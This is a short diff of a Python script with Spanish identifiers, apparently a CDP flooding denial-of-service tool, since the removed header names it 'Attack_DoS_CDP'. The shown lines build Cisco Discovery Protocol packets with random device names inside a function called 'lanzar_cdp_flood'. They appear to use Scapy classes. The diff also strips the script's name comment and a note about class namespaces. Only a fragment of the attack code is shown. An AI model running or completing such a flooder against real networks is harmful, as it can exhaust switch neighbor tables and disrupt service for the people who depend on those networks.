@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-# Script: Attack_DoS_CDP_20250737.py
 import sys
 import random
 import string
@@ -27,7 +26,6 @@ def lanzar_cdp_flood(interfaz):
             
             nombre_dispositivo = generar_cadena_aleatoria(12).encode()
             
-            # ✅ Sin prefijo "cdp." — las clases están en el namespace global
             cdp_cabecera    = CDPv2_HDR(vers=2, ttl=180)
             tlv_id_dispositivo = CDPMsgDeviceID(val=nombre_dispositivo)
             tlv_id_puerto   = CDPMsgPortID(iface=b"Ethernet0/1")
